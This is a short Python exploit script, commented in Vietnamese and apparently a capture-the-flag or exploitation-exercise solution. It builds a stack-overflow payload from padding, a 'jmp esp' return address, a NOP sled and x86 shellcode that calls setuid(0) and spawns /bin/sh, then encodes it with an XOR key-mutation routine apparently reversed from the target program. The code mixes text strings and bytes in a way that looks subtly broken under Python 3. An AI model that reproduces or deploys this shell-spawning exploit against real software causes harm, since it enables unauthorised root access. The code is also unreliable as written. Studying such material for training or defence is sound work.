import struct

def xcrypt(content, length):
    encrypted = bytearray()  # Sử dụng bytearray để lưu trữ dữ liệu mã hóa

    key = 0xea1ab19f  # Khóa mã hóa ban đầu (giống như var_C trong mã giả)

    for word in range(length // 4):  # Thay thế 'xrange' bằng 'range' trong Python 3 và sử dụng phép chia nguyên '//' 
        # Lấy 4 byte mỗi lần
        byte_data = content[word*4:((word*4)+4)]

        # Chuyển đổi 4 byte thành một số nguyên (32-bit) theo định dạng little-endian
        long_to_xor = struct.unpack('<L', byte_data)[0]

        # Mã hóa bằng cách áp dụng XOR với khóa
        encrypted_bytes = long_to_xor ^ key

        # Thêm kết quả đã mã hóa vào dữ liệu đầu ra
        encrypted.extend(struct.pack('<L', encrypted_bytes))

        # Thực hiện biến đổi khóa cho mỗi vòng lặp
        for mutation in range(8):
            if (key & 1) != 0:
                key = key >> 1
                key = key ^ 0x6daa1cf4
            else:
                key = key >> 1

    return bytes(encrypted)  # Trả về dữ liệu mã hóa dưới dạng bytes

if __name__ == '__main__':

    # 08048e93  ; jmp esp
    shellcode = (
        "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
        "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
    )

    content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
    length = len(content)

    encrypted = xcrypt(content, length)
    print (encrypted)